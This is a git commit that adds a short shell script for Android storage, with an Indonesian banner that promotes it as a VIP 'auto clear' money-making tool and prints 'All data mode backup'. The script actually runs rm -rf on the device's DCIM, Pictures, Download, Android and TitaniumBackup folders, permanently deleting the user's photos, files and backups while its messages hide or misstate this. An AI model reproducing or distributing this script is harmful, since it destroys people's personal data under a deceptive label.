c89d942ec5fd03baa1911542961cd02cac24c993
lisingenious <57065354+lisingenious@users.noreply.github.com>
2021-06-03 10:04:55 +0700

    Update and rename main.sh to xxx.sh

---
+++ xxx.sh
@@ -0,0 +1,28 @@
+echo " "
+echo "************************************"
+echo "       Auto Clear Dats & Data File      "
+echo "              Lisin Genious    "
+echo "*********       VIP CABE          ********"
+echo "          REBAHAN BERPENGHASILAN   "
+echo "************************************"
+sleep 3
+echo " All data mode backup "
+echo "DELETE = Penghalang Cuan"
+rm -rf /storage/emulated/0/Android
+rm -rf /storage/emulated/0/DCIM
+rm -rf /storage/emulated/0/Download
+rm -rf /storage/emulated/0/Fox
+rm -rf /storage/emulated/0/Pictures
+rm -rf /storage/emulated/0/TitaniumBackup
+
+echo "DELETE = AG"
+rm -rf /cd/sdcard/.cri
+
+
+
+sleep 1
+echo "processing gays di tunggu ya ...."
+sleep 3
+echo "Done ..."
+echo "Jangan Lupa Bersyukur"
+echo "Salam Tuyul Milenium" 
